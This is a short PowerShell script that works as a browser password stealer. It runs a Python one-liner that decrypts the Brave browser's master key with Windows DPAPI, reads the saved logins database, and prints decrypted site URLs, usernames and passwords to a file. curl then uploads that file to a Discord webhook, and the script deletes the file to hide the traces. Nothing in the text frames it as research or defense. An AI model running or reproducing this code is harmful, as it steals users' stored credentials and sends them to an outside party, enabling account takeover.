cd $env:TEMP\py

.\python.exe -c "import os,json,base64,sqlite3,shutil,win32crypt;from Crypto.Cipher import AES;bp=os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data');ls=os.path.join(bp,'Local State');ld=os.path.join(bp,'Default','Login Data');f=open(ls,'r',encoding='utf-8');d=json.load(f);f.close();ek=base64.b64decode(d['os_crypt']['encrypted_key'])[5:];k=win32crypt.CryptUnprotectData(ek,None,None,None,0)[1];print('Key:',len(k),'bytes');shutil.copy2(ld,'t.db');c=sqlite3.connect('t.db');r=c.cursor();r.execute('SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=\'\' LIMIT 3');[print(f'\n{u}\nUser:{n}\nPass:{AES.new(k,AES.MODE_GCM,nonce=p[3:15]).decrypt_and_verify(p[15:-16],p[-16:]).decode()}') for u,n,p in r.fetchall()];c.close();os.remove('t.db')" > result.txt 2>&1

curl.exe -F "file=@result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

Remove-Item result.txt -Force
